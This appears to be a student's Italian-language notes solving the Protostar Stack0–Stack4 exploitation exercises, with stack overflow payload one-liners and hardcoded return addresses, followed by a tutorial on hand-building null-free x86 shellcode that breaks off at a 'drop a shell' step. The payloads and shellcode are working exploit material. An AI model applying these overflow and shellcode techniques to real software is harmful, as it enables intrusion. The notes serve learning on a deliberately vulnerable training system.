# Exploit-Exercises-Protostar-

###########
# Stack0: #
#########################################################
#							#
# python -c 'print "a"*65' | ./stack0			#
#							#
#########################################################

###########
# Stack1: #
#########################################################
#							#
# ./stack1 $(python -c 'print "a"*64+"dcba"')		#
#							#
#########################################################

###########
# Stack2: #
#################################################################
#							        #
# export GREENIE=$(python -c 'print "a"*64+"\x0a\x0d\x0a\x0d"') #			
#							        #
#################################################################

###########
# Stack3: #
#################################################################
#							        #
# strings -o stack3 --> 00 25					#
# objdump -d stack3 > /home/user/dump.txt 			#
# python -c 'print "a"*64+"\x24\x84\x04\x08"' | ./stack3	#
#								#							        
#################################################################

###########
# Stack4: #
###############################################################################################################################
#							         							      #
# il buffer è di 64 ma fa spazio a per 80 --> si vede quando fa sub 0x50 					              #
# python -c 'print "a"*72+"\x08\xf8\xff\xbf"+"\xf4\x83\x04\x08"' > /home/user/adre.txt //72 + 4(addr1) + 4(addr2) = 80*	      #
# gdb stack4														      #
# br 16 //riga di codice in c, oppure br main										      #
# disas main														      #
# run < /home/user/stack4 												      #
# info register 													      #
#															      #  
###############################################################################################################################
# * non serviva sistemare ebp ma non mi ero accorto di aver vinto e sono andato avanti con le ricerche  #
#########################################################################################################


STEP (1)

//sito con le syscall http://www.lxhp.in-berlin.de/lhpsysc0a.html
main() 
{ 
 
        char *var; 
        var = "\nsono molto contento\n"; // 21 byte, lo \n conta per 1 
 
        printf("\nOffset var: %p\n", var); //mi  prendo l' indirizzo
 
        __asm__(  
		//write
		"movl $0x15,%edx\n\t" //carico in edx la lunghezza della stinga (15 in esa corrisponde a 21)
        "movl $0x400608,%ecx\n\t" //carico in ecx l' indirizzo dove prendere la stringa
        "movl $0x1,%ebx\n\t" //specifico lo standard dove scrivere (stdout) il terminale in questo caso
        "movl $0x4,%eax\n\t"  //il corrispondente della syscall che fa la write, cioè la numero 4         
        "int $0x80\n\t" //entro in kernel mode         
		
		//exit
        "movl $0x0,%ebx\n\t"  //il valore con il quale voglio terminare la funzione
        "movl $0x1,%eax\n\t" //il corrisponde della syscall che fa la exit del metodo
        "int $0x80\n\t"); //kernel mode per fare la exit
 
} 

//attenzione, per far andare il codice rimuovere i commenti e gli a capo


STEP(2)
//questa volta abbiamo tutto il codice in asm

main()
{  __asm__(  
	"jmp ENDER\n\t"

        "STARTER:\n\t"
	//Write
        "pop %ecx\n\t" //faccio la pop dallo stack, nello stack c' era l' indirizzo della funzione successiva alla chiamata, cioè l' indirizzo nella stinga che inserisco nella syscall
	"movl $0x15,%edx\n\t" 
        "movl $0x1,%ebx\n\t" 
        "movl $0x4,%eax\n\t" 
        "int $0x80\n\t" 

	//Exit
        "movl $0x0,%ebx\n\t"
        "movl $0x1,%eax\n\t"
        "int $0x80\n\t" 

	"ENDER: call STARTER\n\t" //salta subito nella funzione starter epusho l' indirizzo della stringa (funzione successiva) che corrisponde all' indirizzo in cui rientrare
	".string  \"\nsono molto contento\n\" " //qui lo \" mi serve come escape per non perdere le "" esterne
	 );
} 

STEP(3)
Non devo sistemare gli indirizzi come nella guida perche ho usato le label, quindi fa lui in automatico, ma con 
- gdb nomeprogramma
-disas main
noto che il mio codice va da: main+3 a ENDER+4
Quindi in gdb con l' opzione x/50bx mi prendo i vari byte in formato esadecimale: 0xeb
OPPURE objdump e mi ritrovo il codice in formato esadecimale con di fianco il rispettivo asm

"\xeb\x1e"                  		/* jmp    0x80483b7(ender) */ 
"\xba\x15\x00\x00\x00"                  /* mov    $0x15,%edx */ 
"\x59"          			/* pop    %ecx */ 
"\xbb\x01\x00\x00\x00"                  /* mov    $0x1,%ebx */ 
"\xb8\x04\x00\x00\x00"                  /* mov    $0x4,%eax */ 
"\xcd\x80" 		                /* int    $0x80 */ 
"\xbb\x00\x00\x00\x00"                  /* mov    $0x0,%ebx */ 
"\xb8\x01\x00\x00\x00"                  /* mov    $0x1,%eax */ 
"\xcd\x80" 	                        /* int    $0x80 */ 
"\xe8\xdd\xff\xff\xff"                 	/* call   0x8048399(starter) */ 

Adesso eliminiamo i null bite: 
- per azzerare un registro xor con se stesso
- per mettere un valore in un registro uso l' inverso. es: se metto 3 in un posto che prende decine otterrei 03. Quindi metto 10 (full) e tolgo 7.
- per mettere un valore in un registro parte 2: ciclo
xorl %edx,%edx
LABEL:
inc %edx
cmp $0xnumerochevuoiinesadecimale,%edx
jne LABEL 

step(4)
Nuovo codice asm

main()
{  __asm__(  
	"jmp ENDER\n\t"
        "STARTER:\n\t"
        "pop %ecx\n\t" 
	"xorl %edx,%edx\n\t"
	"LABEL:\n\t"
	"inc %edx\n\t"
	"cmp $0x15,%edx\n\t"
	"jne LABEL\n\t"
        "xorl %ebx,%ebx\n\t" 
	"inc %ebx\n\t"
        "xorl %eax,%eax\n\t"
	"inc %eax\n\t"
	"inc %eax\n\t"
	"inc %eax\n\t"
	"inc %eax\n\t"
        "int $0x80\n\t" 
        "xorl %ebx,%ebx\n\t" 
        "xorl %eax,%eax\n\t"
	"inc %eax\n\t"
        "int $0x80\n\t" 
	"ENDER: call STARTER\n\t" 
	".string  \"\nsono molto contento\n\" " 
	 );
} 

GENERA:

"\xeb\x1b"                  		/* jmp    0x80483b4(ender) */ 
"\x59"          			/* pop    %ecx */ 
"\x31\xd2" 		                /* xor    %edx,%edx */ 
"\x42"     		                /* inc    %edx */ 
"\x83\xfa\x15"  	                /* cmp    $0x15,%edx */ 
"\x75\xfa" 		                /* jne    804839c(label) */ 
"\x31\xdb"		                /* xor    %ebx,%ebx */ 
"\x43"     			        /* inc    %ebx */ 
"\x31\xc0" 	                        /* xor    %eax,%eax */ 
"\x40"         		        	/* inc    %eax */ 
"\x40"         		        	/* inc    %eax */ 
"\x40"         		        	/* inc    %eax */ 
"\x40"         		        	/* inc    %eax */ 
"\xcd\x80"         		        /* int    $0x80 */    
"\x31\xdb"         		       	/* xor    %ebx,%ebx */ 
"\x31\xc0"         		       	/* xor    %eax,%eax */ 
"\x40"         		        	/* inc    %eax */ 
"\xcd\x80"         		        /* int    $0x80 */
"\xe8\xe0\xff\xff\xff"                 	/* call   0x8048399(starter) */ 


Step(5):
A questo punto riportiamo il codice in formato shellcode tradizionale:
const char shellcode[]=""\xeb\x1b\x59\x31\xd2\x42\x83\xfa\x15\x75\xfa\x31\xdb\x43\x31\xc0\x40\x40\x40\x40\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe0\xff\xff\xff\nsono molto contento\n";

void main(void){
	((*(void (*) ()) shellcode)());
}

Step(6):
Facciamo droppare la shell:
